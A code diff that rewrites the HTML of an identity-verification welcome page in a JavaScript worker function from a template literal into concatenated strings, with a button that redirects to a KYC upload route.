@@ -313,68 +313,70 @@ function pageStart(env) {
   const message = 'Your secure financial identity verification is ready';
   const logo = env.LOGO_URL || 'https://streamalphax.com/logo.png';
   
-  return new Response(`<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Identity Verification - ${company}</title>
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { 
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-      background: #f8f9fa;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      min-height: 100vh;
-      padding: 20px;
-    }
-    .container {
-      background: white;
-      padding: 48px 32px;
-      border-radius: 8px;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-      text-align: center;
-      max-width: 500px;
-      width: 100%;
-    }
-    .logo { max-width: 120px; height: auto; margin-bottom: 24px; }
-    h1 { color: #1f2937; font-size: 28px; margin-bottom: 16px; }
-    p { color: #6b7280; font-size: 16px; line-height: 1.6; margin-bottom: 32px; }
-    .btn {
-      background: #4f46e5;
-      color: white;
-      border: none;
-      padding: 14px 32px;
-      font-size: 16px;
-      font-weight: 500;
-      border-radius: 6px;
-      cursor: pointer;
-      transition: background 0.2s;
-    }
-    .btn:hover { background: #4338ca; }
-    .btn:disabled { background: #9ca3af; cursor: not-allowed; }
-    .error { color: #ef4444; margin-top: 16px; font-size: 14px; }
-    .loading { color: #6b7280; margin-top: 16px; font-size: 14px; }
-  </style>
-</head>
-<body>
-    <div class="container">
-    <img src="${logo}" alt="${company}" class="logo" onerror="this.style.display='none'">
-    <h1>Welcome to ${company}</h1>
-    <p>${message}</p>
-    <button id="startBtn" class="btn">Continue</button>
-    <div id="message"></div>
-  </div>
-  
-    <script>
-    document.getElementById('startBtn').addEventListener('click', () => {
-      window.location.href = '/kyc/upload';
-    });
-  </script>
-</body>
-</html>`, { headers: { 'Content-Type': 'text/html' } });
+  return new Response(
+    '<!DOCTYPE html>' +
+    '<html lang="en">' +
+    '<head>' +
+    '  <meta charset="UTF-8">' +
+    '  <meta name="viewport" content="width=device-width, initial-scale=1.0">' +
+    '  <title>Identity Verification - ' + company + '</title>' +
+    '  <style>' +
+    '    * { margin: 0; padding: 0; box-sizing: border-box; }' +
+    '    body { ' +
+    '      font-family: -apple-system, BlinkMacSystemFont, \'Segoe UI\', sans-serif;' +
+    '      background: #f8f9fa;' +
+    '      display: flex;' +
+    '      align-items: center;' +
+    '      justify-content: center;' +
+    '      min-height: 100vh;' +
+    '      padding: 20px;' +
+    '    }' +
+    '    .container {' +
+    '      background: white;' +
+    '      padding: 48px 32px;' +
+    '      border-radius: 8px;' +
+    '      box-shadow: 0 2px 8px rgba(0,0,0,0.1);' +
+    '      text-align: center;' +
+    '      max-width: 500px;' +
+    '      width: 100%;' +
+    '    }' +
+    '    .logo { max-width: 120px; height: auto; margin-bottom: 24px; }' +
+    '    h1 { color: #1f2937; font-size: 28px; margin-bottom: 16px; }' +
+    '    p { color: #6b7280; font-size: 16px; line-height: 1.6; margin-bottom: 32px; }' +
+    '    .btn {' +
+    '      background: #4f46e5;' +
+    '      color: white;' +
+    '      border: none;' +
+    '      padding: 14px 32px;' +
+    '      font-size: 16px;' +
+    '      font-weight: 500;' +
+    '      border-radius: 6px;' +
+    '      cursor: pointer;' +
+    '      transition: background 0.2s;' +
+    '    }' +
+    '    .btn:hover { background: #4338ca; }' +
+    '    .btn:disabled { background: #9ca3af; cursor: not-allowed; }' +
+    '    .error { color: #ef4444; margin-top: 16px; font-size: 14px; }' +
+    '    .loading { color: #6b7280; margin-top: 16px; font-size: 14px; }' +
+    '  </style>' +
+    '</head>' +
+    '<body>' +
+    '  <div class="container">' +
+    '    <img src="' + logo + '" alt="' + company + '" class="logo" onerror="this.style.display=\'none\'">' +
+    '    <h1>Welcome to ' + company + '</h1>' +
+    '    <p>' + message + '</p>' +
+    '    <button id="startBtn" class="btn">Continue</button>' +
+    '    <div id="message"></div>' +
+    '  </div>' +
+    '  <script>' +
+    '    document.getElementById(\'startBtn\').addEventListener(\'click\', () => {' +
+    '      window.location.href = \'/kyc/upload\';' +
+    '    });' +
+    '  </script>' +
+    '</body>' +
+    '</html>',
+    { headers: { 'Content-Type': 'text/html' } }
+  );
 }
 
 function pageUpload(env) {
